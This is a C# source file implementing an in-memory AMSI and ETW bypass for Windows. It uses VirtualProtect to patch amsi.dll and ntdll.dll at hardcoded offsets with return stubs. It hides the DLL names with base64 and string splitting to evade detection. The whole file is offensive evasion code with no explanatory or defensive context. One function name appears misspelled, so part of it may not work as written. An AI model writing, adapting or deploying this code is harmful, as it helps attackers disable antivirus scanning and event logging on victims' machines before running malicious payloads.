using System;
using System.Runtime.InteropServices;

public class Amsi{
    static byte[] x64_etw_patch = new byte[] {0x48, 0x33, 0xc0, 0xc3};
    static byte[] x86_etw_patch = new byte[] {0x33, 0xc0, 0xc2, 0x14, 0x00};
    public static Int64 x64_etw_offset = 0x1ed60;
    public static Int64 x86_etw_offset = 0x590;
    public static Int64 x64_ASB_offset = 0xcb0;
    public static Int64 x86_ASB_offset = 0x970;
    static byte[] x64 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xc3};
    static byte[] x86 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xc2, 0x18, 0x00};

    private static string decode(string b64encoded){
        return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
    }

    private static bool is64Bit(){
        bool is64Bit = true;
        if (IntPtr.Size == 4)
            is64Bit = false;
        return is64Bit;
    }

    public static void Bypass(){
        if (is64Bit()){
            PatchAmsi(x64, x64_ASB_offset);
            PatchEtw(x64_etw_patch, x64_etw_offset);
        }
        else
        {
            PatchAmsi(x86, x86_ASB_offset);
            PatchEtw(x86_etw_patch, x86_etw_offset);    
        }
    }

    private static void PatchMem(byte[] patch, string library, string function, Int64 offset = 0){
        try
        {
            uint newProtect;
            uint oldProtect;
            IntPtr libPtr = Win32.LoadLibrary(library);
            IntPtr functPtr = Win32.GetProcAddress(libPtr, function);
            if (offset != 0){
                functPtr = new IntPtr(functPtr.ToInt64() + offset);
            }
            Win32.VirtualProtect(functPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, functPtr, patch.Length);
            Win32.VirtualProtect(functPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [i] {0}", e.Message);
            Console.WriteLine(" [i] {0}", e.InnerException);
        }
    }

    private static void PatchAmsi(byte[] patch, Int64 offset){
        string dll = decode("YW1zaS5kbGw=");
        PatchMem(patch, dll, "DllGetClassObject", offset);
    }

    private static void PatchEtw(byte[] Patch, Int64 offset){
        PatchMem(Patch, "nt" + "dll" + "." + "dll","RtlInitialzeResource",offset);
    }
}

class Win32{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpaddress, UIntPtr dwSize, uint flNewProtect, out uint lpOldProtect);
}